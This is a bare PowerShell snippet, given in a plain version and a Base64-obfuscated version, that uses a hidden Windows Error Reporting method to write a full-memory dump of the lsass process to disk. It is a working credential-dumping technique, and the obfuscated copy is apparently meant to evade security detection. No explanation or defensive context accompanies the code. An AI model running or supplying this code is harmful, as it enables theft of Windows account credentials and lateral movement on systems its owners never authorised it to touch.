$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2;$Process = Get-Process -Name lsass;$ProcessId = $Process.Id;$ProcessName = $Process.Name;$ProcessHandle = $Process.Handle;$DumpFilePath = "c:\users\user\desktop\";$ProcessFileName = "$($ProcessName)_$($ProcessId).dmp";$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName;$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,$ProcessId,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()


#obfuscated
$WER = [PSObject].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFcAaQBuAGQAbwB3AHMARQByAHIAbwByAFIAZQBwAG8AcgB0AGkAbgBnAA=='))));$WNM = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MDWD = $WNM.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBEAHUAbQBwAFcAcgBpAHQAZQBEAHUAbQBwAA=='))), $Flags);$MDWFM = [UInt32] 2;$Process = Get-Process -Name lsass;$ProcessId = $Process.Id;$ProcessName = $Process.Name;$ProcessHandle = $Process.Handle;$DumpFilePath = "c:\users\user\desktop\";$ProcessFileName = "$($ProcessName)_$($ProcessId).dmp";$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName;$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$Result = $MDWD.Invoke($null, @($ProcessHandle,$ProcessId,$FileStream.SafeFileHandle,$MDWFM,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()
